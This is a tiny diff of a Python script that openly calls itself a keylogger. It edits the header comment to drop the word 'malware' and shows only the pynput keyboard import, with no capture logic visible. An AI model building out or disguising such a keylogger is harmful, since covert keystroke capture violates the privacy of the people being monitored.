@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-#This is a simple keylogger malware that stores keylogs on a local directory 
+#This is a simple keylogger that stores keylogs on a local directory 
 
 
 from pynput.keyboard import Key, Listener
